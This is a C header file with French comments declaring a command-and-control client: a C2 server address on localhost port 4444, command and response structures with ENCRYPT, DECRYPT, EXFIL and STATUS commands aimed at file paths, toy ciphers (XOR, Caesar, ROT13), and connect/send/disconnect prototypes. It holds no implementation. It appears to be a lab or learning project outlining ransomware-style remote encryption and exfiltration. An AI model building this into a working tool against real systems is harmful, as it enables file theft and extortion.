#ifndef C2_CLIENT_H
#define C2_CLIENT_H

#define C2_SERVER_IP "127.0.0.1"
#define C2_SERVER_PORT 4444

typedef struct {
    char command[64];       // ENCRYPT, DECRYPT, EXFIL, STATUS
    char target[256];       // Chemin du fichier/dossier
    char key[128];          // Clé de chiffrement
    int mode;               // 0=XOR, 1=Caesar, 2=ROT13
    int shift;              // Pour César/ROT13
} C2Command;

typedef struct {
    int status;             // 0=success, -1=error
    char message[512];      // Message de retour
    long bytes_processed;   // Octets traités
} C2Response;

// Connexion au serveur C2
int c2_connect(const char *ip, int port);

// Envoie une commande et attend la réponse
C2Response c2_send_command(int sockfd, const C2Command *cmd);

// Ferme la connexion
void c2_disconnect(int sockfd);

#endif
